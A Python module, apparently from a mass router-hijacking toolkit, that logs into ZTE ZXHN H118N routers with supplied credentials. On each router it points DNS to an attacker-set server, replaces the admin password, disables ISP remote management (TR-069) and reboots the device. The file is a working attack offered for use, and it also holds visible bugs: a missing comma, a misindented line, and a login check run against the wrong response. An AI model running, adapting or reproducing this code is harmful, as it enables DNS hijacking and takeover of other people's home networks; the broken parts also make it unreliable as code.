import re
import requests
from requests import RequestException, ReadTimeout
from time import sleep

from shared import *

def zte_H118N(target):
    if (auth := parse_target(target)) is None:
        return Status.WrongAuth

    ip, username, password, status = auth

    s = requests.Session()
    s.hooks = { 'response': lambda r, *args, **kwargs: r.raise_for_status() }
    s.headers.update({
        'User-Agent': random.choice(useragents),
        'Accept-Language': 'ru,en-US;q=0.7,en;q=0.3'
    })

    try:
        res = s.get(f'http://{ip}', timeout=TIMEOUT)
    except RequestException:
        return Status.Inaccessible

    if fingerprint(res) != 'ZXHN H118N /// Mini web server 1.0 ZTE corp 2005.':
        return Status.WrongTarget

    matchtoken = re.search(r'getObj\("Frm_Logintoken"\).value = "(.*)";', res.text)
    if matchtoken is None:
        return Status.Inaccessible
    else:
        logintoken = matchtoken.group(1)

    try:
        s.post(f'http://{ip}/', {
            'action': 'login',
            'Username': username,
            'Password': password,
            'Frm_Logintoken': logintoken,
        }, timeout=TIMEOUT)
    except RequestException:
        return Status.Inaccessible

    if 'User information is error' in res.text or 'ÐÑÐ¸Ð±ÐºÐ° Ð¿ÑÐ¸' in res.text:
        return Status.WrongAuth

    if '2008-2020 ZTE Co Ltd' in res.text:
        try:
            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
                'DnsCMAPIEnabled': 'NULL',
                'DomainName': 'NULL',
                'SerIPAddress1': NEWDNS
                'SerIPAddress2': '0.0.0.0',
                'SerIPAddress3': 'NULL',
                'SerIPAddress4': 'NULL',
                'SerIPAddress5': 'NULL',
                'SerIPv6Address1': '::',
                'SerIPv6Address2': '::',
                'SerIPv6Address3': 'NULL',
                'SerIPv6Address4': 'NULL',
                'SerIPv6Address5': 'NULL',
                'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
            }, timeout=TIMEOUT)

            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=manager_user_conf_t.gch', {
                'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
                'IF_INDEX': '1',
                'Type': 'NULL',
                'Enable': 'NULL',
                'Username': username,
                'OldUsername': username,
                'Password': NEWPASS,
                'Right': 'NULL',
                'OldPassword': password,
            }, timeout=TIMEOUT)

        except RequestException:
            return Status.PartialSuccess

    else:
        try:
             s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
                'Tr069Enable': '0',
                'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
            }, timeout=TIMEOUT)

            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
                'DNSServer1': NEWDNS,
                'DNSServer2': '0.0.0.0',
                'DNSServer3': '',
                'DnsServerSource': '0',
                'ISPDnsServerSource': 'NULL',
                'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
            }, timeout=TIMEOUT)

            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
                'SerIPAddress1': NEWDNS,
                'SerIPAddress2': '0.0.0.0',
                'IF_ACTION': 'apply',
                'IF_ERRORSTR': 'SUCC',
                'IF_ERRORPARAM': 'SUCC',
                'IF_ERRORTYPE': '-1',
            }, timeout=TIMEOUT)

        except RequestException:
            return Status.PartialSuccess

    try:
        s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch', {
            'IF_ACTION': 'devrestart',
            'IF_ERRORSTR': 'SUCC',
            'IF_ERRORPARAM': 'SUCC',
            'IF_ERRORTYPE': '-1',
            'IF_PAGE': '',
            'flag': '1',
        }, timeout=TIMEOUT)
    except ReadTimeout:
        return Status.Success
    except RequestException:
        return Status.PartialSuccess

    return Status.PartialSuccess
